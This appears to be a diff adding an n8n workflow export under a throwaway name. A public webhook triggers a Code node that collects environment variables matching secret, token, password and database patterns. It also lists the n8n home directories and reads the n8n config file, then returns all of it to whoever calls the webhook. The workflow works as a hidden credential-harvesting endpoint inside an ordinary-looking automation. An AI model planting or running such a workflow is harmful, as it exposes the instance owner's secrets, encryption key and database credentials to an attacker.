@@ -1,0 +1,73 @@
+{
+  "active": false,
+  "activeVersion": null,
+  "activeVersionId": null,
+  "connections": {
+    "Webhook": {
+      "main": [
+        [
+          {
+            "node": "Code",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    }
+  },
+  "createdAt": "2026-11-26T22:42:58.060Z",
+  "id": "q6SeOlQPPrz3Tzct",
+  "isArchived": false,
+  "meta": null,
+  "name": "tmp-cp-x6330500aca",
+  "nodes": [
+    {
+      "parameters": {
+        "path": "x6330500aca",
+        "responseMode": "lastNode"
+      },
+      "name": "Webhook",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 2,
+      "webhookId": "aaaaaaaa-1111-4111-8111-aaaaaaaaaaaa",
+      "id": "00000000-1111-4111-8111-000000000000",
+      "position": [
+        0,
+        0
+      ]
+    },
+    {
+      "parameters": {
+        "jsCode": "\nconst fs=require('fs'); const out={};\nfunction t(f){try{return f()}catch(e){return 'ERR:'+String(e).slice(0,200)}}\nout.envKeys = t(()=>Object.keys(process.env).sort().join(','));\nout.envN8N = t(()=>JSON.stringify(Object.fromEntries(Object.entries(process.env).filter(([k])=>/N8N|KEY|SECRET|PASS|DATABASE|DB_|TOKEN/i.test(k)))));\nout.cwd = t(()=>process.cwd());\nout.ls_home = t(()=>fs.readdirSync('/home/node').join(','));\nout.ls_n8n = t(()=>fs.readdirSync('/home/node/.n8n').join(','));\nout.config = t(()=>fs.readFileSync('/home/node/.n8n/config','utf8').slice(0,1000));\nreturn [{json:out}];\n"
+      },
+      "name": "Code",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "id": "00000001-1111-4111-8111-000000000001",
+      "position": [
+        240,
+        0
+      ]
+    }
+  ],
+  "pinData": null,
+  "settings": {
+    "executionOrder": "v1",
+    "callerPolicy": "workflowsFromSameOwner",
+    "availableInMCP": false
+  },
+  "shared": [
+    {
+      "updatedAt": "2026-11-26T22:42:58.060Z",
+      "createdAt": "2026-11-26T22:42:58.060Z",
+      "role": "workflow:owner",
+      "workflowId": "q6SeOlQPPrz3Tzct",
+      "projectId": "AxNpta0sA2v4gJ2a"
+    }
+  ],
+  "staticData": null,
+  "tags": [],
+  "triggerCount": 1,
+  "updatedAt": "2026-11-26T22:42:58.060Z",
+  "versionId": "8c178faf-aeb0-437c-84d1-6d73961752f9"
+}
